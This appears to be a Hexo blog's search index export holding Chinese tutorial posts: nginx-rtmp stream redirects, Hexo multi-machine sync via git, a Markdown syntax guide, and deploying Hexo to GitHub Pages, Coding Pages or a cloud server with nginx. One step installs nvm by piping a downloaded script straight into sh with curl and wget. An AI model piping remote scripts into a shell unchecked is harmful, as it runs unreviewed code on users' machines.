newname? permanent; &#125; location /remote_redirect &#123; # no domain name here, only ip rewrite ^.*$ rtmp://192.168.1.123/someapp/somename? permanent; &#125; &#125; rtmp &#123; application myapp1 &#123; live on; # stream will be redirected to &apos;newname&apos; on_play http://localhost:8080/local_redirect; &#125; application myapp2 &#123; live on; # stream will be pulled from remote location # requires nginx &gt;= 1.3.10 on_play http://localhost:8080/remote_redirect; &#125;&#125; HTTP 请求接收到一些个参数。在 application/x-www-form-urlencoded MIME 类型下使用 POST 方法。以下参数会被传送给调用者： call=play。 addr - 客户端 IP 地址。 app - application 名。 flashVer - 客户端 flash 版本。 swfUrl - 客户端 swf url。 tcUrl - tcUrl。 pageUrl - 客户端页面 url。 name - 流名。出了上述参数之外其他所有播放命令参数显式地发送回调。例如如果一个流由 url rtmp://localhost/app/movie?a=100&amp;b=face&amp;foo=bar 访问，然后呢 a,b 和 foo 发送回调。on_play http://example.com/my_callback; 过程中使用到的额外软件 obs 手机端:快直播 ffmpeg推流（没用过）]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>rtmp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo+gitPages Synchronization]]></title>
    <url>%2F2019%2F05%2F16%2Fhexo-gitPages-Synchronization%2F</url>
    <content type="text"><![CDATA[Hexo+gitPages 的博客多端同步管理及迁移 本文参考 如何解决github+Hexo的博客多终端同步问题 利用Hexo在多台电脑上提交和更新github pages博客 搭建hexo博客并简单的实现多终端同步 hexo博客同步管理及迁移 主体的思路是将博文内容相关文件放在Github项目中master中，将Hexo配置写博客用的相关文件(包括博客内容主题等等)放在Github项目的hexo分支上，这个是关键，多终端的同步只需要对分支hexo进行操作。 同步的首次操作在创建了博客的目录下操作，push本地文件夹Hexo中的必要文件到yourname.github.io的hexo分支上。 只托管部分用于多终端的同步的文件 注意：使用第三方主题时，要删除第三方主题的.git文件夹删除，不然无法push到远程仓库 1234567git init //初始化本地仓库git add source //将必要的文件依次添加，有些文件夹如npm install产生的node_modules由于路径过长不好处理，所以这里没有用`git add .`命令了，而是依次添加必要文件，如下图所示,其实也可以用'git add .'命令，在.gitignore文件中加入不需要同步的文件即可git commit -m "Blog Source Hexo"git branch hexo //新建hexo分支git checkout hexo //切换到hexo分支上git remote add origin git@github.com:yourname/yourname.github.io.git //将本地与Github项目对接git push origin hexo //push到Github项目的hexo分支上 多出来的hexo的分支，用于文件同步，原有的master分支用于部署静态博客页面 在新终端进行更新博客先从github中把文件clone到本地，然后安装相应组件。然后通过git的提交同步内容，用hexo的命令部署博客到gitPages里。 12345678git clone -b hexo git@github.com:yourname/yourname.github.io.git //将Github中hexo分支clone到本地cd yourname.github.io //切换到刚刚clone的文件夹内npm install //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再inithexo new post "new blog name" //新建一个.md文件，并编辑完成自己的博客内容git add source //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客，如果更改了主题样式的话还是建议用'git add .'git commit -m "XX"git push origin hexo //更新分支hexo d -g //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master 已有博客的终端更新博客进入相应的文件夹，更新博客直行命令即可。 123456git pull origin hexo//先pull完成本地和远端的融合hexo new post "new blog"git add .git commit -m "Blog update"git push origin hexohexo d -g]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown Syntax]]></title>
    <url>%2F2019%2F05%2F14%2FMarkdown-Syntax%2F</url>
    <content type="text"><![CDATA[Markdown Syntax 本文参考 Markdown基本语法(简书) Markdown官方文档 Markdown语法html支持 Markdown部分详细用法 标题Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。 12345678Atx形式# 这是一级标题## 这是二级标题### 这是三级标题#### 这是四级标题##### 这是五级标题###### 这是六级标题 这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题1234567Setext形式This is an H1=============This is an H2------------- This is an H1This is an H2根据标题生成目录1[TOC] 根据标题自动生成目录 [TOC] 字体1234**这是加粗的文字***这是倾斜的文字*`***这是斜体加粗的文字***~~这是加删除线的文字~~ 加粗测试 倾斜测试 斜体加粗测试 删除线测试 引用1234&gt;这是引用的内容&gt;&gt;这是引用的内容&gt;&gt;&gt;多重引用&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容 引用测试一 引用测试二 多重引用 引用测试 分割线1234-------******** 只要三个以上就可以 图片引用1234![图片alt](图片地址 ''图片title'')图片alt就是显示在图片下面的文字，相当于对图片内容的解释。图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加 12![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg "区块链") 插入带有链接的图片1234[[图片上传失败...(image-f83b77-1542510791300)]](http://www.baidu.com)&#123;:target="_blank"&#125; // 内链式[[图片上传失败...(image-4dc956-1542510791300)]][5]&#123;:target="_blank"&#125; // 引用式[5]: http://www.baidu.com [图片上传失败…(image-f83b77-1542510791300)]{:target=”_blank”} 内链式 [图片上传失败…(image-f83b77-1542510791300)]{:target=”blank”} 外链式 超链接引用12[超链接名](超链接地址 "超链接title")title可加可不加 12[简书](http://jianshu.com)[百度](http://baidu.com) baidu 注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。 1234&lt;a href=&quot;超链接地址&quot; target=&quot;_blank&quot;&gt;超链接名&lt;/a&gt;示例&lt;a href=&quot;https://www.jianshu.com/u/1f5ac0cf6a8b&quot; target=&quot;_blank&quot;&gt;简书&lt;/a&gt; 简书 视频插入注：Markdown 语法是不支持直接插入视频的 普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法 第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面 代码1 注：多数第三方平台不支持插入&lt;iframe&gt;视频 1&lt;iframe height=498 width=510 src='http://player.youku.com/embed/XMjgzNzM0NTYxNg==' frameborder=0 'allowfullscreen'&gt;&lt;/iframe&gt; 代码2 1[[图片上传失败...(image-49aefe-1542510791300)]](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&amp;from=y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target="_blank"&#125; 列表1234567无序列表用任一种皆可- 列表内容+ 列表内容* 列表内容注意：- + * 跟内容之间都要有一个空格 列表（-） 列表（-） 列表（+） 列表（*） 1234567有序列表内容1.列表内容2.列表内容3.列表内容注意：序号跟内容之间要有空格 第一点 第二点 第三点 12345678910111213141516171819**上一级和下一级之间敲三个空格即可**- 一级无序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 二级无序列表内容- 一级无序列表内容 1. 二级有序列表内容 2. 二级有序列表内容 3. 二级有序列表内容1. 一级有序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 二级无序列表内容2. 一级有序列表内容 1. 二级有序列表内容 2. 二级有序列表内容 3. 二级有序列表内容 上一级和下一级之间敲三个空格即可 一级无序列表内容 二级无序列表内容 二级无序列表内容 二级无序列表内容 一级无序列表内容 二级有序列表内容 二级有序列表内容 二级有序列表内容 一级有序列表内容 二级无序列表内容 二级无序列表内容 二级无序列表内容 一级有序列表内容 二级有序列表内容 二级有序列表内容 二级有序列表内容 表格1234567891011表头|表头|表头---|:--:|---:内容|内容|内容内容|内容|内容第二行分割表头和内容。- 有一个就行，为了对齐，多加了几个文字默认居左-两边加：表示文字居中-右边加：表示文字居右注：原生的语法两边都要用 | 包起来。此处省略 12345姓名|技能|排行--|:--:|--:刘备|哭|大哥关羽|打|二哥张飞|骂|三弟 姓名 技能 排行 刘备 哭 大哥 关羽 打 二哥 张飞 骂 三弟 Typora编辑器中可以直接使用crtl+T，或者在菜单段落中找到表格生成 代码引用单行代码 1`代码内容` int main(){return 0;} 代码块 12345(```)language 代码... 代码... 代码...(```) 注：为了防止转译，前后三个反引号处加了小括号，实际是没有的。这里只是用来演示，实际中去掉两边小括号即可。 123456#include&lt;iostream&gt;using namespace std;int main()&#123; cout&lt;&lt; "hello markdown"; return 0;&#125; 格式化代码html版123&lt;pre&gt;## 这是一个不起作用的标题&lt;/pre&gt; ## 这是一个不起作用的标题 流程图注： st=&gt;start: 开始 的：后面保持空格 形参 实参 含义 tag st 标签 (可以自定义) =&gt; =&gt; 赋值 type start 类型 (6种类型) content 开始 描述内容 (可以自定义) :&gt;url http://www.baidu.com[blank] 链接与跳转方式 兼容性很差 6种类型 含义 start 启动 end 结束 operation 程序 subroutine 子程序 condition 条件 inputoutput 输出 形参 实参 含义 -&gt; -&gt; 连接 condition c1 条件 (布尔值,方向) (yes,right) 如果满足向右连接，4种方向：right ，left，up ，down 默认为：down 注：operation (程序); subroutine (子程序) ;condition (条件)，都可以在括号里加入连接方向。 123456789```flowst=&gt;start: 开始op=&gt;operation: My Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op&amp;``` 12345678st=&gt;start: 开始op=&gt;operation: My Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op&amp; 12345678910111213## 选项框```markdown- [x] 选项一- [ ] 选项二 需要注意的是：-、[x]、和选择一之间都要有空格，如果不下x[ ]中也要有空格 选项一 选项二 数学公式支持LaTex的数学公式，参考https://www.jianshu.com/p/2bbec51d756f 数学公式（MathJax)，参考https://www.jianshu.com/p/a0aa94ef8ab2 注：1个$左对齐，2个居中 12$$ x \href&#123;why-equal.html&#125;&#123;=&#125; y^2 + 1 $$$ x = &#123;-b \pm \sqrt&#123;b^2-4ac&#125; \over 2a&#125;. $ $$x \href{why-equal.html}{=} y^2 +1$$ 使用Typora的时候可以直接使用 $$+回车，或者用crtl+shift+M生成公式块（在段落菜单中的公式块） 参考https://blog.csdn.net/mingzhuo_126/article/details/82722455 脚注12Markdown[^1][^1]: Markdown是一种纯文本标记语言 // 在文章最后面显示脚注 Markdown^1 锚点注：只有标题支持锚点， 跳转目录方括号后 保持空格 123[公式标题锚点](#1)### [需要跳转的目录] &#123;#1&#125; // 方括号后保持空格 脚注标题锚点 123由于&#123;# 是hexo的标注语言hexo 中 &#123;# 属于保留字段 &#123;# ... #&#125;属于注释字段把```以外的&#123;#改成&#123;&#123; '&#123;#' &#125;&#125;即可解决 自动邮箱链接1&lt;xxx@outlook.com&gt; &#120;&#x78;&#x78;&#x40;&#x6f;&#117;&#x74;&#108;&#x6f;&#x6f;&#107;&#x2e;&#99;&#x6f;&#109; 时序图代码1 123456​```sequenceA-&gt;&gt;B: 你好Note left of A: 我在左边 // 注释方向，只有左右，没有上下Note right of B: 我在右边B--&gt;A: 很高兴认识你​ 12345678910111213141516171819202122**演示**![img](https:////upload-images.jianshu.io/upload_images/6912209-784ce9bb7beb6672.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/393/format/webp)**代码详解**注：`A-&gt;&gt;B: 你好` 后面可以不写文字，但是一定要在最后加上`：` Note left of A 代表注释在A的左边| 符号 | 含义 || ---- | -------- || `-` | 实线 || `&gt;` | 实心箭头 || `--` | 虚线 || `&gt;&gt;` | 空心箭头 |**代码2** 123456789起床-&gt;吃饭: 稀饭油条吃饭-&gt;上班: 不要迟到了上班-&gt;午餐: 吃撑了上班-&gt;下班:Note right of 下班: 下班了下班-&gt;回家:Note right of 回家: 到家了回家--&gt;&gt;起床:Note left of 起床: 新的一天 演示 转义字符由于markdown语法的原因，可以用\进行转义。]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo+gitpages]]></title>
    <url>%2F2019%2F05%2F14%2Fhexo-gitpages%2F</url>
    <content type="text"><![CDATA[hexo+gitPages搭建个人博客 本文参考 hexo 博客搭建 hexo官方文档 【持续更新】最全Hexo博客搭建+主题优化+插件配置+常用操作+错误分析 手把手教你搭建自己的个人博客（图文教程） 搭建篇 –使用Github+hexo搭建个人博客教程—总结自己爬过的坑) GitHub+Hexo 搭建个人网站详细教程 史上最详细的Hexo博客搭建图文教程 hexo优化 hexo博客改装和一些细节优化 https://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化 Hexo NexT 博客后台管理指南 Hexo主题更改以及小功能的添加 hexo-NexT主题配置 NexT官方展示 NexT官方中文文档ReadME NexT源码 NexT文档 Hexo的Next主题详细配置 hexo的next主题个性化教程:打造炫酷网站 hexo的next主题个性化教程：打造炫酷网站 【持续更新】hexo next主题优化手册 可参考博客嘤 yilia主题 yilia主题源码（GitHub） yilia主题展示 hexo博客搭建安装前提安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序： Node.js (Should be at least nodejs 6.9) Git 如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。 1$ npm install -g hexo-cli 如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。 如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。 Mac 用户 您在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install 安装命令行工具。 安装 Git Windows：下载并安装 git. Mac：使用 Homebrew, MacPorts ：brew install git;或下载 安装程序 安装。 Linux (Ubuntu, Debian)：sudo apt-get install git-core Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core Windows 用户 由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考这个页面，收录了存储于百度云的下载地址。 安装 Node.js安装 Node.js 的最佳方式是使用 nvm。 cURL: 1$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh Wget: 1$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh 安装完成后，重启终端并执行下列命令即可安装 Node.js。 1$ nvm install stable 或者您也可以下载 安装程序 来安装。 Windows 用户 对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选Add to PATH选项。另外，您也可以使用Git Bash，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用Git Bash来进行操作。 安装 Hexo所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。 1$ npm install -g hexo-cli 在安装的时候我用的是npm install hexo --save 关于npm命令回顾 npm install 命令最近在写Node程序的时候，突然对 npm install 的-save和-save-dev 这两个参数的使用比较混乱。其实博主在这之前对这两个参数的理解也是模糊的，各种查资料和实践后对它们之间的异同点略有理解。遂写下这篇文章避免自己忘记，同时也给node猿友一点指引。 我们在使用 npm install 安装模块的模块的时候 ，一般会使用下面这几种命令形式： 1234npm install moduleName # 安装模块到项目目录下`npm install -g moduleName # -g 的意思是将模块安装到全局，具体安装到磁盘哪个位置，要看 npm config prefix 的位置。npm install -save moduleName # -save 的意思是将模块安装到项目目录下，并在package文件的dependencies节点写入依赖。npm install -save-dev moduleName # -save-dev 的意思是将模块安装到项目目录下，并在package文件的devDependencies节点写入依赖。 那么问题来了，在项目中我们应该使用四个命令中的哪个呢？这个就要视情况而定了。下面对这四个命令进行对比，看完后你就不再这么问了。 npm install moduleName 命令 安装模块到项目node_modules目录下。 不会将模块依赖写入devDependencies或dependencies 节点。 运行 npm install 初始化项目时不会下载模块。 npm install -g moduleName 命令 安装模块到全局，不会在项目node_modules目录中保存模块包。 不会将模块依赖写入devDependencies或dependencies 节点。 运行 npm install 初始化项目时不会下载模块。 npm install -save moduleName 命令 安装模块到项目node_modules目录下。 会将模块依赖写入dependencies 节点。 运行 npm install 初始化项目时，会将模块下载到项目目录下。 运行npm install –production或者注明NODE_ENV变量值为production时，会自动下载模块到node_modules目录中。 npm install -save-dev moduleName 命令 安装模块到项目node_modules目录下。 会将模块依赖写入devDependencies 节点。 运行 npm install 初始化项目时，会将模块下载到项目目录下。 运行npm install –production或者注明NODE_ENV变量值为production时，不会自动下载模块到node_modules目录中。 建站安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。 &lt;folder&gt; 为hexo安装目录 123$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install 新建完成后，指定文件夹的目录如下： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes _config.yml网站的 配置 信息，您可以在此配置大部分的参数。 package.json应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。 12345678910111213141516171819package.json&#123; &quot;name&quot;: &quot;hexo-site&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;hexo&quot;: &#123; &quot;version&quot;: &quot;&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;hexo&quot;: &quot;^3.8.0&quot;, &quot;hexo-generator-archive&quot;: &quot;^0.1.5&quot;, &quot;hexo-generator-category&quot;: &quot;^0.1.3&quot;, &quot;hexo-generator-index&quot;: &quot;^0.2.1&quot;, &quot;hexo-generator-tag&quot;: &quot;^0.2.0&quot;, &quot;hexo-renderer-ejs&quot;: &quot;^0.3.1&quot;, &quot;hexo-renderer-stylus&quot;: &quot;^0.3.3&quot;, &quot;hexo-renderer-marked&quot;: &quot;^0.3.2&quot;, &quot;hexo-server&quot;: &quot;^0.3.3&quot; &#125;&#125; scaffolds模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。 Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。 source资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。 themes主题 文件夹。Hexo 会根据主题来生成静态页面。 配置您可以在 _config.yml 中修改大部分的配置。 网站 参数 描述 title 网站标题 subtitle 网站副标题 description 网站描述 author 您的名字 language 网站使用的语言 timezone 网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：America/New_York, Japan, 和 UTC 。 其中，description主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。author参数用于主题显示文章的作者。 网址 参数 描述 默认值 url 网址 root 网站根目录 permalink 文章的 永久链接 格式 :year/:month/:day/:title/ permalink_defaults 永久链接中各部分的默认值 网站存放在子目录 如果您的网站存放在子目录中，例如 http://yoursite.com/blog，则请将您的 url设为 http://yoursite.com/blog 并把 root 设为 /blog/。 目录 参数 描述 默认值 source_dir 资源文件夹，这个文件夹用来存放内容。 source public_dir 公共文件夹，这个文件夹用于存放生成的站点文件。 public tag_dir 标签文件夹 tags archive_dir 归档文件夹 archives category_dir 分类文件夹 categories code_dir Include code 文件夹 downloads/code i18n_dir 国际化（i18n）文件夹 :lang skip_render 跳过指定文件的渲染，您可使用 glob 表达式来匹配路径。 提示 如果您刚刚开始接触Hexo，通常没有必要修改这一部分的值。 文章 参数 描述 默认值 new_post_name 新文章的文件名称 :title.md default_layout 预设布局 post auto_spacing 在中文和英文之间加入空格 false titlecase 把标题转换为 title case false external_link 在新标签中打开链接 true filename_case 把文件名称转换为 (1) 小写或 (2) 大写 0 render_drafts 显示草稿 false post_asset_folder 启动 Asset 文件夹 false relative_link 把链接改为与根目录的相对位址 false future 显示未来的文章 true highlight 代码块的设置 相对地址 默认情况下，Hexo生成的超链接都是绝对地址。例如，如果您的网站域名为example.com,您有一篇文章名为hello，那么绝对链接可能像这样：http://example.com/hello.html，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。 分类 &amp; 标签 参数 描述 默认值 default_category 默认分类 uncategorized category_map 分类别名 tag_map 标签别名 日期 / 时间格式Hexo 使用 Moment.js 来解析和显示时间。 参数 描述 默认值 date_format 日期格式 YYYY-MM-DD time_format 时间格式 H:mm:ss 分页 参数 描述 默认值 per_page 每页显示的文章量 (0 = 关闭分页功能) 10 pagination_dir 分页目录 page 扩展 参数 描述 theme 当前主题名称。值为false时禁用主题 deploy 部署部分的设置 部署当执行完npm install之后即可通过hexo s或者hexo serve通过本地访问hexo博客。 此时博客已搭建在本地了。 方案一：GithubPages 创建Github账号 创建仓库， 仓库名为：&lt;Github账号名称&gt;.github.io 将本地Hexo博客推送到GithubPages 3.1. 安装hexo-deployer-git插件。在命令行（即Git Bash）运行以下命令即可： 1$ npm install hexo-deployer-git --save 3.2. 添加SSH key。 创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可： 1$ ssh-keygen -t rsa -C &quot;邮箱地址&quot; 添加到 github。 复制密钥文件内容（路径形如C:\Users\Administrator\.ssh\id_rsa.pub），粘贴到New SSH Key即可。 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功： 12$ ssh -T git@github.com$ yes 3.3. 修改_config.yml（在站点目录下）。文件末尾修改为： 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io.git branch: master 注意：上面仓库地址写ssh地址，不写http地址。 3.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送： 12$ hexo g$ hexo d 等待1分钟左右，浏览器访问网址： https://&lt;Github账号名称&gt;.github.io 至此，您的Hexo博客已经搭建在GithubPages, 域名为https://&lt;Github账号名称&gt;.github.io。 方案二：GithubPages + 域名在方案一的基础上，添加自定义域名（您购买的域名）。 域名解析。 类型选择为 CNAME； 主机记录即域名前缀，填写为www； 记录值填写为自定义域名； 解析线路，TTL 默认即可。 仓库设置。 2.1. 打开博客仓库设置：https://github.com/&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io/settings 2.2. 在Custom domain下，填写自定义域名，点击save。 2.3. 在站点目录的source文件夹下，创建并打开CNAME.txt，写入你的域名（如www.simon96.online），保存，并重命名为CNAME。 等待10分钟左右。 浏览器访问自定义域名。 至此，您的Hexo博客已经解析到自定义域名，https://&lt;Github账号名称&gt;.github.io依然可用。 （可在github仓库中设置跳转至个人域名） 绑定域名虽然在Internet上可以访问我们的网站，但是网址是GitHub提供的:http://xxxx.github.io (知乎排版可能会出现”http://“字样) 而我们想使用我们自己的个性化域名，这就需要绑定我们自己的域名。这里演示的是在阿里云万网的域名绑定，在国内主流的域名代理厂商也就阿里云和腾讯云。登录到阿里云，进入管理控制台的域名列表，找到你的个性化域名，进入解析 然后添加解析 包括添加三条解析记录，192.30.252.153是GitHub的地址，你也可以ping你的 http://xxxx.github.io 的ip地址，填入进去。第三个记录类型是CNAME，CNAME的记录值是：你的用户名.http://github.io 这里千万别弄错了。第二步，登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名 点击save保存。第三步，进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。这里我还是写了www(不建议带有www): 保存，命名为CNAME ，注意保存成所有文件而不是txt文件。 完成这三步，进入blog目录中，按住shift键右击打开命令行，依次输入： 123hexo cleanhexo ghexo d 这时候打开浏览器在地址栏输入你的个性化域名将会直接进入你自己搭建的网站。 方案三：GithubPages + CodingPages + 域名GithubPages 在国内较慢，百度不收录，而CodingPages 在国外较快。所以在方案二的基础上，添加CodingPages 。 创建Coding账号 创建仓库， 仓库名为：&lt;Coding账号名称&gt; 进入项目里『代码』页面，点击『一键开启静态 Pages』，稍等片刻CodingPages即可部署成功。 将本地Hexo博客推送到CodingPages 4.1. 鉴于创建GithubPages 时，已经生成过公钥。可直接复制密钥文件内容（路径形如C:\Users\Administrator\.ssh\id_rsa.pub）， 粘贴到新增公钥。 4.2. 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功： 12$ ssh -T git@git.coding.net$ yes 4.3. 修改_config.yml（在存放Hexo初始化文件的路径下）。文件末尾修改为： 123456789# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:- type: git repo: git@github.com:&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io.git branch: master- type: git repo: git@git.dev.tencent.com:&lt;Coding账号名称&gt;/&lt;Coding账号名称&gt;.git branch: master 4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送： 12$ hexo g$ hexo d 域名解析 添加 CNAME 记录指向 &lt;Coding账号名称&gt;.coding.me 类型选择为 CNAME； 主机记录即域名前缀，填写为www； 记录值填写为自定义域名； 解析线路，TTL 默认即可。 添加 两条A 记录指向 192.30.252.153和192.30.252.154 类型选择为 A； 主机记录即域名前缀，填写为@； 记录值填写为192.30.252.153和192.30.252.154； 解析线路，境外或谷歌。 在『Pages 服务』设置页（https://dev.tencent.com/u/&lt;Coding账号名称&gt;/p/&lt;Coding账号名称&gt;/git/pages/settings）中绑定自定义域名。 至此，您的Hexo博客已经解析到自定义域名，https://&lt;Github账号名称&gt;.github.io和https://&lt;Coding账号名称&gt;.coding.me依然可用。 方案四：云服务器 + 域名该方案需要先购买云服务器和域名。 在云服务器安装Git 和 Nginx。(Git 用于版本管理和部署，Nginx 用于静态博客托管。) 登陆root用户，运行： 12$ yum -y update$ yum install -y git nginx Nginx配置 2.1. 创建文件目录(用于博客站点文件存放) 123cd /usr/local/mkdir hexochmod 775 -R /usr/local/hexo/ 2.2. 添加 index.html(用于检测配置 Nginx 是否成功) 1vim /usr/local/hexo/index.html 添加以下代码，并保存。 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Nginx running&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 2.3. 配置 Nginx 服务器 1vim /etc/nginx/nginx.conf 修改server_name和root： 123456server &#123; listen 80 default_server; listen [::]:80 default_server; server_name www.baidu.com; # 填个人域名 root /usr/local/hexo/; &#125; 2.4. 启动nginx服务； 1service nginx start 2.5. 云服务器浏览器访问个人域名或IP，若跳转index.html，则配置完成，否则检查以上配置。 git配置 3.1. 创建文件目录, 用于私人 Git 仓库搭建, 并更改目录读写权限。 123cd /usr/local/mkdir hexoRepochmod 775 -R /usr/local/hexoRepo/ 3.2. Git 初始化裸库。 12cd hexoRepo/git init --bare hexo.git 3.3. 创建 Git 钩子(hook)。 1vim /usr/local/hexoRepo/hexo.git/hooks/post-receive 3.4. 输入以下信息，用于指定 Git 的源代码 和 Git 配置文件。 123#!/bin/bashgit --work-tree=/usr/local/hexo --git-dir=/usr/local/hexoRepo/hexo.git checkout -f 3.5. 保存并退出后, 给该文件添加可执行权限。 1chmod +x /usr/local/hexoRepo/hexo.git/hooks/post-receive 本地博客推送到云服务器 4.1. 安装hexo-deployer-git插件。在命令行（即Git Bash）运行以下命令即可： 1$ npm install hexo-deployer-git --save 4.2. 添加SSH key。 创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可： 1$ ssh-keygen -t rsa -C &quot;邮箱地址&quot; 添加到 github。 复制密钥文件内容（路径形如C:\Users\Administrator\.ssh\id_rsa.pub），粘贴到New SSH Key即可。 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功： 12$ ssh -T git@github.com$ yes 4.3. 修改_config.yml（在站点目录下）。文件末尾修改为： 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: root@xxx.xxx.xxx.xxx:/usr/local/hexoRepo/hexo //用户名@域名或 IP 地址:/usr/local/hexoRepo/hexo branch: master 注意：上面仓库地址写ssh地址，不写http地址。 4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送： 12$ hexo g$ hexo d 等待1分钟左右，浏览器访问个人域名。 至此，您的Hexo博客已经搭建在云服务器, 域名为个人域名。 Hexo常用命令123456789hexo new "postName" #新建文章hexo new page "pageName" #新建页面hexo clean #清除部署緩存hexo n == hexo new #新建文章hexo g == hexo generate #生成静态页面至public目录hexo s == hexo server #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览）hexo d == hexo deploy #将.deploy目录部署到GitHubhexo g -d #生成加部署hexo g -s #生成加预览 注：当本地预览和远程部署的浏览结果不同的时候，不妨使用hexo clean &amp;&amp; hexo g -d试试。 创建文章命令： 123$ hexo new [layout] &lt;title&gt;复制代码 参数说明： [layout]可以为以下三种： 参数名 功能 文章路径 post 新建博文 source/_posts page 新建页面（如404，分类） source draft 草稿 source/_drafts 草稿可通过一下命令发布： 123$ hexo publish [layout] &lt;title&gt;复制代码 title注意： 不是博文标题， 是博文markdown文件的名字， 也是博文链接的后缀（如https://www.simon96.online/2018/10/12/hexo-tutorial/中的hexo-tutorial） 文章模版 创建模版 在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，例如： $ hexo new blog “simon” ​ 在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 blog.md，并根据其内容建立文章。 修改参数 以下是您可以在模版中使用的变量： 变量 描述 layout 布局 title 标题 date 文件建立日期 Front-matter就是博文最上方以 --- 分隔的那部分。 